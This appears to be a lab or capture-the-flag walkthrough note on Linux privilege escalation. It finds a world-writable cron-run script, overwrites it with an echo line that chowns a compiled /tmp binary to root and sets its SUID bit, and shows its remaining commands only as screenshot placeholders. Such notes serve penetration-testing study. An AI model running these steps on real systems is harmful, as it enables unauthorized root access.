Cron jobs generally run with root privileges. If we can successfully tamper any script or binary which are defined in the cron jobs then we can execute arbitrary code with root privilege.

```bash
ls -la /etc/cron.d          print all cron jobs
```

![](Pasted%20image%2020250701101400.png)

```bash
find / -perm -2 -type f 2>/dev/null   world writeable files
ls -la /usr/local/sbin/cron            logrotate.sh  check if it writeable
```

![](Pasted%20image%2020250701101722.png)

cron-lograte.sh is world writable and it is being run by logrotate cronjob. Any command we write/append in cron-lograte.sh would be executed as ‘root’.
We write a C file in /tmp directory and compile it.

![](Pasted%20image%2020250701101818.png)

```
ls -la rootme          tells owned by user ‘SHayslett   
```

![](Pasted%20image%2020250701101923.png)

```
echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh
```

![](Pasted%20image%2020250701104102.png)
